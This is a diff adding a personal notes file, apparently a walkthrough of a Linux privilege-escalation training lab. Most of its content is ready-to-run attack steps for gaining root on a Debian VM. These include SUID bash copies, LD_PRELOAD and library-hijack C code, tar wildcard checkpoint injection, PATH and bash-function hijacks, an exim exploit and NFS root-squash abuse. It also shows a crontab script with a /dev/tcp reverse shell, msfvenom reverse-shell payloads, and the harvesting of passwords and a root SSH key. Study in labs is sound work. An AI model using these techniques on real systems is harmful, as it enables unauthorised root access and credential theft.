+Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
+</rich_text>
+				<rich_text family="monospace">select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');</rich_text>
+				<rich_text>
+Exit out of the MySQL shell (type </rich_text>
+				<rich_text weight="heavy">exit</rich_text>
+				<rich_text> or </rich_text>
+				<rich_text weight="heavy">\q</rich_text>
+				<rich_text> and press </rich_text>
+				<rich_text weight="heavy">Enter</rich_text>
+				<rich_text>) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+</rich_text>
+				<rich_text family="monospace">/tmp/rootbash -p</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text weight="heavy">Remember  to remove the /tmp/rootbash executable and exit out of the root shell  before continuing as you will create this file again later in the room!</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text family="monospace">rm /tmp/rootbash
+exit</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="shared_library" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655875094.09" ts_lastsave="1655875094.49" unique_id="54">
+				<rich_text>Sudo can be configured to inherit certain environment variables from the user's environment.
+Check which environment variables are inherited (look for the env_keep options):
+</rich_text>
+				<rich_text family="monospace">sudo -l</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text weight="heavy">Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+</rich_text>
+				<rich_text>
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+
+LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD  loads a shared object before any others when a program is run.  LD_LIBRARY_PATH provides a list of directories where shared libraries  are searched for first.
+Create a shared object using the code located at /home/user/tools/sudo/preload.c:
+</rich_text>
+				<rich_text family="monospace">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</rich_text>
+				<rich_text>
+
+preload.c
+cat /home/user/tools/sudo/preload.c
+#include &lt;stdio.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;stdlib.h&gt;
+
+void _init() {
+        unsetenv(&quot;LD_PRELOAD&quot;);
+        setresuid(0,0,0);
+        system(&quot;/bin/bash -p&quot;);
+}
+
+Run one of the programs you are allowed to run via sudo (listed when running </rich_text>
+				<rich_text weight="heavy">sudo -l</rich_text>
+				<rich_text>), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
+</rich_text>
+				<rich_text family="monospace">sudo LD_PRELOAD=/tmp/preload.so program-name-here</rich_text>
+				<rich_text>
+
+A  root shell should spawn. Exit out of the shell before continuing.  Depending on the program you chose, you may need to exit out of this as  well.
+Run ldd against the apache2 program file to see which shared libraries are used by the program:
+</rich_text>
+				<rich_text family="monospace">ldd /usr/sbin/apache2</rich_text>
+				<rich_text>
+
+Create  a shared object with the same name as one of the listed libraries  (libcrypt.so.1) using the code located at  /home/user/tools/sudo/library_path.c:
+</rich_text>
+				<rich_text family="monospace">gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</rich_text>
+				<rich_text>
+
+Run  apache2 using sudo, while settings the LD_LIBRARY_PATH environment  variable to /tmp (where we output the compiled shared object):
+</rich_text>
+				<rich_text family="monospace">sudo LD_LIBRARY_PATH=/tmp apache2</rich_text>
+				<rich_text>
+
+A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1  to the name of another library used by apache2 and re-run apache2 using  sudo again. Did it work? If not, try to figure out why not, and how  the library_path.c code could be changed to make it work.</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="library_directory" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655875719.97" ts_lastsave="1655875720.45" unique_id="57">
+				<rich_text>then change crontab shell/binary to run what we want
+
+check shared library directory
+</rich_text>
+				<rich_text family="monospace">ldd /usr/sbin/apache2</rich_text>
+				<rich_text> / ldd &lt;binary_path&gt;
+
+        linux-vdso.so.1 =&gt;  (0x00007fff217ff000)
+        libpcre.so.3 =&gt; /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f7befb59000)
+        libaprutil-1.so.0 =&gt; /usr/lib/libaprutil-1.so.0 (0x00007f7bef935000)
+        libapr-1.so.0 =&gt; /usr/lib/libapr-1.so.0 (0x00007f7bef6fb000)
+        libpthread.so.0 =&gt; /lib/libpthread.so.0 (0x00007f7bef4df000)
+        libc.so.6 =&gt; /lib/libc.so.6 (0x00007f7bef173000)
+        libuuid.so.1 =&gt; /lib/libuuid.so.1 (0x00007f7beef6e000)
+        librt.so.1 =&gt; /lib/librt.so.1 (0x00007f7beed66000)
+        libcrypt.so.1 =&gt; /lib/libcrypt.so.1 (0x00007f7beeb2f000) &lt; we can overwrite this library to spawn shell
+        libdl.so.2 =&gt; /lib/libdl.so.2 (0x00007f7bee92a000)
+        libexpat.so.1 =&gt; /usr/lib/libexpat.so.1 (0x00007f7bee702000)
+        /lib64/ld-linux-x86-64.so.2 (0x00007f7bf0016000)
+
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+sudo LD_LIBRARY_PATH=/tmp apache2
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="crontab_rewrite" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655875375.77" ts_lastsave="1655876612.01" unique_id="55">
+				<rich_text># /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+
+script_rewrite
+
+#!/bin/bash
+bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1
+
+</rich_text>
+				<rich_text family="monospace">nc -nvlp 4444</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="PATH_environment_variable" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655875693.02" ts_lastsave="1655876610.22" unique_id="56">
+				<rich_text family="monospace">cat /etc/crontab</rich_text>
+				<rich_text>
+
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+
+Note that the PATH variable starts with </rich_text>
+				<rich_text weight="heavy">/home/user</rich_text>
+				<rich_text> which is our user's home directory.
+Create a file called </rich_text>
+				<rich_text weight="heavy">overwrite.sh</rich_text>
+				<rich_text> in your home directory with the following contents:
+#!/bin/bash
+
+cp /bin/bash /tmp/rootbash
+chmod +xs /tmp/rootbash
+Make sure that the file is executable:
+</rich_text>
+				<rich_text family="monospace">chmod +x /home/user/overwrite.sh</rich_text>
+				<rich_text>
+Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
+
+</rich_text>
+				<rich_text family="monospace">/tmp/rootbash -p</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text weight="heavy">Remember  to remove the modified code, remove the /tmp/rootbash executable and  exit out of the elevated shell before continuing as you will create this  file again later in the room!</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text family="monospace">rm /tmp/rootbash
+exit</rich_text>
+				<rich_text>
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="crontab_wildcard" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655875846.19" ts_lastsave="1655875940.34" unique_id="58">
+				<rich_text>cat/etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+#
+* * * * * root overwrite.sh
+* * * * * root /usr/local/bin/compress.sh
+
+
+</rich_text>
+				<rich_text family="monospace">cat /usr/local/bin/compress.sh</rich_text>
+				<rich_text>
+
+#!/bin/sh
+cd /home/user
+tar czf /tmp/backup.tar.gz *
+
+Note that the tar command is being run with a wildcard (*) in your home directory.
+Take a look at the GTFOBins page for </rich_text>
+				<rich_text link="webs https://gtfobins.github.io/gtfobins/tar/">tar</rich_text>
+				<rich_text>. Note that tar has command line options that let you run other commands as part of a checkpoint feature.
+Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
+</rich_text>
+				<rich_text family="monospace">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf</rich_text>
+				<rich_text>
+Transfer the shell.elf file to </rich_text>
+				<rich_text weight="heavy">/home/user/</rich_text>
+				<rich_text> on the Debian VM (you can use </rich_text>
+				<rich_text weight="heavy">scp</rich_text>
+				<rich_text> or host the file on a webserver on your Kali box and use </rich_text>
+				<rich_text weight="heavy">wget</rich_text>
+				<rich_text>). Make sure the file is executable:
+</rich_text>
+				<rich_text family="monospace">chmod +x /home/user/shell.elf</rich_text>
+				<rich_text>
+Create these two files in /home/user:
+</rich_text>
+				<rich_text family="monospace">touch /home/user/--checkpoint=1
+touch /home/user/--checkpoint-action=exec=shell.elf</rich_text>
+				<rich_text>
+When  the tar command in the cron job runs, the wildcard (*) will expand to  include these files. Since their filenames are valid tar command line  options, tar will recognize them as such and treat them as command line  options rather than filenames.
+Set up a netcat listener on  your Kali box on port 4444 and wait for the cron job to run (should not  take longer than a minute). A root shell should connect back to your  netcat listener.
+
+</rich_text>
+				<rich_text family="monospace">nc -nvlp 4444</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text weight="heavy">Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text family="monospace">rm /home/user/shell.elf
+rm /home/user/--checkpoint=1
+rm /home/user/--checkpoint-action=exec=shell.elf</rich_text>
+				<rich_text>
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="suid_sgid_known exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655876160.31" ts_lastsave="1655876161.22" unique_id="59">
+				<rich_text>Find all the SUID/SGID executables on the Debian VM:
+</rich_text>
+				<rich_text family="monospace">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</rich_text>
+				<rich_text>
+Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. </rich_text>
+				<rich_text link="webs https://www.exploit-db.com/">Exploit-DB</rich_text>
+				<rich_text>, Google, and GitHub are good places to search!
+A  local privilege escalation exploit matching this version of exim  exactly should be available. A copy can be found on the Debian VM at </rich_text>
+				<rich_text weight="heavy">/home/user/tools/suid/exim/cve-2016-1531.sh</rich_text>
+				<rich_text>.
+Run the exploit script to gain a root shell:
+</rich_text>
+				<rich_text family="monospace">/home/user/tools/suid/exim/cve-2016-1531.sh</rich_text>
+				<rich_text>
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="suid_sgid_shared_object_injection" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655876745.51" ts_lastsave="1655877029.61" unique_id="60">
+				<rich_text>The </rich_text>
+				<rich_text weight="heavy">/usr/local/bin/suid-so</rich_text>
+				<rich_text> SUID executable is vulnerable to shared object injection.
+First, execute the file and note that currently it displays a progress bar before exiting:
+</rich_text>
+				<rich_text family="monospace">/usr/local/bin/suid-so</rich_text>
+				<rich_text>
+
+Run </rich_text>
+				<rich_text weight="heavy">strace</rich_text>
+				<rich_text> on the file and search the output for open/access calls and for &quot;no such file&quot; errors:
+</rich_text>
+				<rich_text family="monospace">strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE &quot;open|access|no such file&quot;</rich_text>
+				<rich_text>
+access(&quot;/etc/suid-debug&quot;, F_OK)         = -1 ENOENT (No such file or directory)
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+access(&quot;/etc/ld.so.preload&quot;, R_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/etc/ld.so.cache&quot;, O_RDONLY)      = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib/libdl.so.2&quot;, O_RDONLY)       = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/usr/lib/libstdc++.so.6&quot;, O_RDONLY) = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib/libm.so.6&quot;, O_RDONLY)        = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib/libgcc_s.so.1&quot;, O_RDONLY)    = 3
+access(&quot;/etc/ld.so.nohwcap&quot;, F_OK)      = -1 ENOENT (No such file or directory)
+open(&quot;/lib/libc.so.6&quot;, O_RDONLY)        = 3
+open(&quot;/home/user/.config/libcalc.so&quot;, O_RDONLY) = -1 ENOENT (No such file or directory)
+
+Note that the executable tries to load the </rich_text>
+				<rich_text weight="heavy">/home/user/.config/libcalc.so</rich_text>
+				<rich_text> shared object within our home directory, but it cannot be found.
+Create the </rich_text>
+				<rich_text weight="heavy">.config</rich_text>
+				<rich_text> directory for the libcalc.so file:
+</rich_text>
+				<rich_text family="monospace">mkdir /home/user/.config</rich_text>
+				<rich_text>
+
+Example shared object code can be found at </rich_text>
+				<rich_text weight="heavy">/home/user/tools/suid/libcalc.c</rich_text>
+				<rich_text>. It simply spawns a Bash shell. Compile the code into a shared object at the location the </rich_text>
+				<rich_text weight="heavy">suid-so</rich_text>
+				<rich_text> executable was looking for it:
+</rich_text>
+				<rich_text family="monospace">gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</rich_text>
+				<rich_text>
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+static void inject() __attribute__((constructor));
+
+void inject() {
+        setuid(0);
+        system(&quot;/bin/bash -p&quot;);
+}
+
+Execute the </rich_text>
+				<rich_text weight="heavy">suid-so</rich_text>
+				<rich_text> executable again, and note that this time, instead of a progress bar, we get a root shell.
+</rich_text>
+				<rich_text family="monospace">/usr/local/bin/suid-so</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="suid_sgid_environment_variables" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655877231.1" ts_lastsave="1655877338.45" unique_id="61">
+				<rich_text>The </rich_text>
+				<rich_text weight="heavy">/usr/local/bin/suid-env</rich_text>
+				<rich_text> executable can be exploited due to  it inheriting the user's PATH environment variable and attempting to  execute programs without specifying an absolute path.
+
+First, execute the file and note that it seems to be trying to start the apache2 webserver:
+</rich_text>
+				<rich_text family="monospace">/usr/local/bin/suid-env</rich_text>
+				<rich_text>
+
+Run strings on the file to look for strings of printable characters:
+</rich_text>
+				<rich_text family="monospace">strings /usr/local/bin/suid-env</rich_text>
+				<rich_text>
+
+user@debian:~$ strings /usr/local/bin/suid-env
+/lib64/ld-linux-x86-64.so.2
+5q;Xq
+__gmon_start__
+libc.so.6
+setresgid
+setresuid
+system
+__libc_start_main
+GLIBC_2.2.5
+fff.
+fffff.
+l$ L
+t$(L
+|$0H
+service apache2 start
+
+One line (&quot;service apache2 start&quot;) suggests that the </rich_text>
+				<rich_text weight="heavy">service</rich_text>
+				<rich_text>  executable is being called to start the webserver, however the full  path of the executable (/usr/sbin/service) is not being used.
+Compile the code located at </rich_text>
+				<rich_text weight="heavy">/home/user/tools/suid/service.c</rich_text>
+				<rich_text> into an executable called </rich_text>
+				<rich_text weight="heavy">service</rich_text>
+				<rich_text>. This code simply spawns a Bash shell:
+</rich_text>
+				<rich_text family="monospace">gcc -o service /home/user/tools/suid/service.c</rich_text>
+				<rich_text>
+user@debian:~$ cat /home/user/tools/suid/service.c
+int main() {
+        setuid(0);
+        system(&quot;/bin/bash -p&quot;);
+}
+
+
+Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the </rich_text>
+				<rich_text weight="heavy">suid-env</rich_text>
+				<rich_text> executable to gain a root shell:
+</rich_text>
+				<rich_text family="monospace">PATH=.:$PATH /usr/local/bin/suid-env</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text weight="heavy">Remember to exit out of the root shell before continuing!</rich_text>
+				<rich_text>
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="suid_sgid_shell_abuse" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655877425.52" ts_lastsave="1655877433.22" unique_id="62">
+				<rich_text>The </rich_text>
+				<rich_text weight="heavy">/usr/local/bin/suid-env2</rich_text>
+				<rich_text> executable is identical to </rich_text>
+				<rich_text weight="heavy">/usr/local/bin/suid-env</rich_text>
+				<rich_text> except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.
+
+Verify this with strings:
+</rich_text>
+				<rich_text family="monospace">strings /usr/local/bin/suid-env2
+</rich_text>
+				<rich_text>
+In Bash versions </rich_text>
+				<rich_text weight="heavy">&lt;4.2-048</rich_text>
+				<rich_text>  it is possible to define shell functions with names that resemble file  paths, then export those functions so that they are used instead of any  actual executable at that file path.
+Verify the version of Bash installed on the Debian VM is less than 4.2-048:
+</rich_text>
+				<rich_text family="monospace">/bin/bash --version</rich_text>
+				<rich_text>
+Create a Bash function with the name &quot;</rich_text>
+				<rich_text weight="heavy">/usr/sbin/service</rich_text>
+				<rich_text>&quot; that executes a new Bash shell (using -p so permissions are preserved) and export the function:
+</rich_text>
+				<rich_text family="monospace">function /usr/sbin/service { /bin/bash -p; }
+export -f /usr/sbin/service</rich_text>
+				<rich_text>
+Run the </rich_text>
+				<rich_text weight="heavy">suid-env2</rich_text>
+				<rich_text> executable to gain a root shell:
+</rich_text>
+				<rich_text family="monospace">/usr/local/bin/suid-env2</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text weight="heavy">Remember to exit out of the root shell before continuing!</rich_text>
+				<rich_text>
+</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="suid_sgid_shell_abuse" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655877686.07" ts_lastsave="1655877801.25" unique_id="63">
+				<rich_text> Note: This will not work on Bash versions 4.4 and above.
+When in debugging mode, Bash uses the environment variable </rich_text>
+				<rich_text weight="heavy">PS4</rich_text>
+				<rich_text> to display an extra prompt for debugging statements.
+
+Run the </rich_text>
+				<rich_text weight="heavy">/usr/local/bin/suid-env2</rich_text>
+				<rich_text>  executable with bash debugging enabled and the PS4 variable set to an  embedded command which creates an SUID version of /bin/bash:
+</rich_text>
+				<rich_text family="monospace">env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2</rich_text>
+				<rich_text>
+Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
+</rich_text>
+				<rich_text family="monospace">/tmp/rootbash -p</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text weight="heavy">Remember  to remove the /tmp/rootbash executable and exit out of the elevated  shell before continuing as you will create this file again later in the  room!</rich_text>
+				<rich_text>
+</rich_text>
+				<rich_text family="monospace">rm /tmp/rootbash
+exit</rich_text>
+				<rich_text>
+        </rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="pass_and_key_history" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655877801.25" ts_lastsave="1655877965.51" unique_id="64">
+				<rich_text>If a user accidentally types their password on the command line  instead of into a password prompt, it may get recorded in a history  file.
+View the contents of all the hidden history files in the user's home directory:
+</rich_text>
+				<rich_text family="monospace">cat ~/.*history | less</rich_text>
+				<rich_text>
+Note  that the user has tried to connect to a MySQL server at some point,  using the &quot;root&quot; username and a password submitted via the command line.  Note that there is no space between the -p option and the password!
+Switch to the root user, using the password:
+</rich_text>
+				<rich_text family="monospace">su root</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="pass_keys_config_files" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655877846.18" ts_lastsave="1655877988.24" unique_id="65">
+				<rich_text>Config files often contain passwords in plaintext or other reversible formats.
+List the contents of the user's home directory:
+</rich_text>
+				<rich_text family="monospace">ls /home/user</rich_text>
+				<rich_text>
+Note the presence of a </rich_text>
+				<rich_text weight="heavy">myvpn.ovpn</rich_text>
+				<rich_text> config file. View the contents of the file:
+</rich_text>
+				<rich_text family="monospace">cat /home/user/myvpn.ovpn</rich_text>
+				<rich_text>
+The  file should contain a reference to another location where the root  user's credentials can be found. Switch to the root user, using the  credentials:
+</rich_text>
+				<rich_text family="monospace">su root</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="ssh_keys" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655877988.24" ts_lastsave="1655878494.36" unique_id="66">
+				<rich_text>Sometimes users make backups of important files but fail to secure them with the correct permissions.
+Look for hidden files &amp; directories in the system root:
+</rich_text>
+				<rich_text family="monospace">ls -la /</rich_text>
+				<rich_text>
+Note that there appears to be a hidden directory called </rich_text>
+				<rich_text weight="heavy">.ssh</rich_text>
+				<rich_text>. View the contents of the directory:
+</rich_text>
+				<rich_text family="monospace">ls -l /.ssh</rich_text>
+				<rich_text>
+Note that there is a world-readable file called </rich_text>
+				<rich_text weight="heavy">root_key</rich_text>
+				<rich_text>.  Further inspection of this file should indicate it is a private SSH  key. The name of the file suggests it is for the root user.
+Copy the key over to your Kali box (it's easier to just view the contents of the </rich_text>
+				<rich_text weight="heavy">root_key</rich_text>
+				<rich_text> file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:
+</rich_text>
+				<rich_text family="monospace">chmod 600 root_key</rich_text>
+				<rich_text>
+Use the key to login to the Debian VM as the root account:
+</rich_text>
+				<rich_text family="monospace">ssh -i root_key root@10.10.129.53</rich_text>
+			</node>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="NFS" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655878494.36" ts_lastsave="1655878494.7" unique_id="67">
+				<rich_text>Files created via NFS inherit the </rich_text>
+				<rich_text weight="heavy">remote</rich_text>
+				<rich_text> user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the &quot;nobody&quot; user.
+Check the NFS share configuration on the Debian VM:
+</rich_text>
+				<rich_text family="monospace">cat /etc/exports</rich_text>
+				<rich_text>
+Note that the </rich_text>
+				<rich_text weight="heavy">/tmp</rich_text>
+				<rich_text> share has root squashing disabled.
+On your Kali box, switch to your root user if you are not already running as root:
+</rich_text>
+				<rich_text family="monospace">sudo su</rich_text>
+				<rich_text>
+Using Kali's root user, create a mount point on your Kali box and mount the </rich_text>
+				<rich_text weight="heavy">/tmp</rich_text>
+				<rich_text> share (update the IP accordingly):
+</rich_text>
+				<rich_text family="monospace">mkdir /tmp/nfs
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs</rich_text>
+				<rich_text>
+Still using Kali's root user, generate a payload using </rich_text>
+				<rich_text weight="heavy">msfvenom</rich_text>
+				<rich_text> and save it to the mounted share (this payload simply calls /bin/bash):
+</rich_text>
+				<rich_text family="monospace">msfvenom -p linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o /tmp/nfs/shell.elf</rich_text>
+				<rich_text>
+Still using Kali's root user, make the file executable and set the SUID permission:
+</rich_text>
+				<rich_text family="monospace">chmod +xs /tmp/nfs/shell.elf</rich_text>
+				<rich_text>
+Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
+</rich_text>
+				<rich_text family="monospace">/tmp/shell.elf</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text weight="heavy">Remember to exit out of the root shell before continuing!</rich_text>
+				<rich_text>
+</rich_text>
+			</node>
 		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="tests" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394210.03" ts_lastsave="1655727693.85" unique_id="19">
